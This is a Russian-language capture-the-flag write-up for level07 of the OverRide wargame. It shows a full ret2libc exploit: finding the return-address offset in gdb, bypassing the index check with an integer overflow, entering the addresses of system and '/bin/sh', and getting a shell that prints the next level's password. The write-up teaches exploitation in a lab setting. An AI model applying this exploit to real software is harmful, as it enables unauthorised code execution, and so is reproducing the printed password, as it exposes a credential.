Программа представляет собой хранилище чисел, она предлагает пользователю ввести команду: «сохранить», «прочитать» или «выйти».
Команда quit не требует пояснений, команда store считывает индекс и число и сохраняет это число в буфере по заданному индексу, команда чтения читает буфер по заданному индексу.

Мы можем использовать отсутствие связанных проверок в store_number, чтобы переписать адрес возврата функции с помощью ret2libc.

Нам просто нужно найти смещение между буфером, в котором хранится число, и eip функции.
С помощью gdb мы находим, что он равен 456, eip устанавливается в 0xffffd6cc, когда мы вводим функцию «read_number», адрес нашего буфера - 0xffffd504.
Поскольку мы имеем дело с целочисленным буфером, индекс умножается на sizeof (int) = 4.
Это означает, что мы хотим получить доступ к буферу + 456/4, поэтому смещение 114.

Код выполняет проверки, чтобы индекс не был кратен 3, нам нужен способ обойти это.
Поскольку индекс является целым числом, он будет умножен на 4, нам просто нужно переполнить, чтобы он вернулся к 114.

Использование следующей формулы дает нам 4 потенциальных кандидата в диапазоне INT_MAX:
> х * (2 ^ 32/4) + 114
- 114
- 1073741938
- 2147483762
- 3221225586

Мы собираемся использовать эксплойт ret2libc, нам нужно писать в eip и eip + 2, поэтому нам нужен индекс, который при делении на 3 дает 2. Это требуется, чтобы (index + 2)% 3 равнялся 1.

Единственный приемлемый кандидат - 2147483762.
Теперь у нас есть действительный индекс для переопределения eip, мы хотим найти части для создания нашего эксплойта ret2libc: адрес функции `system` и адрес литеральной строки" / bin / sh ".

---------------------------------------------------------------------------------------------------------

level07@OverRide:~$ gdb level07
(gdb) b *0x0804874d
(gdb) run
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x0804874d in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec

---------------------------------------------------------------------------------------------------------

Мы нашли 0xf7e6aed0 для системы и 0xf7f897ec для строки, в десятичном виде это дает нам 4159090384 и 4160264172.

Теперь мы можем запустить наш эксплойт, сначала сохранив адрес `system` в буфере + 2147483762, а затем сохранив адрес нашего строкового литерала в буфере + 2147483762 + 2.

---------------------------------------------------------------------------------------------------------

level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 2147483764
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

---------------------------------------------------------------------------------------------------------
